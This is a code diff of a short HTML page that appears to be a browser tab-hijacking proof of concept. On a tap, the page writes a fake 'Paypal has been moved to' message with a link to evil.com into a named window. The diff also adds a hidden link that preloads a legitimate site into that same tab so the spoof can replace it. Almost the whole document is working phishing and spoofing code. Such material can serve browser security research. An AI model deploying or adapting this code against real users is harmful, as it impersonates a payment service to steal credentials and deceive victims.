@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tap Anywhere</title>
+  <title>Tap Anywhere to Hijack Tab</title>
   <script>
     function pwned() {
-      var t = window.open('javascript:#verylongurl.google.facebook.com');
+      var t = window.open('', 'ss'); // Uses named window/tab "ss"
       if (t) {
         t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
         t.stop();
       } else {
-        alert("Popup blocked!");
+        alert("Popup blocked or window 'ss' not available");
       }
     }
 
     document.addEventListener('DOMContentLoaded', function () {
       function handleTap(e) {
         document.body.removeEventListener('touchstart', handleTap);
-        // Call immediately — avoid delay or popup may get blocked
         pwned();
       }
 
@@ -25,6 +24,9 @@
   </script>
 </head>
 <body>
-  <h1 style="text-align:center; margin-top: 100px;">📱 Tap anywhere to continue</h1>
+  <h1 style="text-align:center; margin-top:100px;">📱 Tap anywhere to launch</h1>
+
+  <!-- Optional: This link can preload the named tab -->
+  <a href="https://legitsite.com" target="ss" style="display:none;">Preload tab</a>
 </body>
 </html>
